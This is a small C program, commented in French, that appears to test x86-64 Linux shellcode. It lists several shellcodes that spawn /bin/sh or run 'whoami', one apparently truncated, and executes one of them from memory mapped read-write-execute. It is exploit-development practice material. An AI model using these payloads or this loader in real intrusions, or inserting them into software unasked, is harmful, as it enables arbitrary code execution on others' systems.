#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stddef.h>

/*shellcodes testés :   /bin/sh "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
                        /bin/sh "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
                        whoami "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f"
*/
int main(int argc, char *argv[]) {
    size_t shellcode_len = 0;

    /*
        unsigned char shellcode[] : variable shellcode à changer en fonction du résultat que nous voulons
    */
    unsigned char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

    shellcode_len = sizeof(shellcode);

    void *shellcode_mem = mmap(0, shellcode_len, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (shellcode_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(shellcode_mem, shellcode, shellcode_len);
    ((void (*)())shellcode_mem)();


    return 0;
}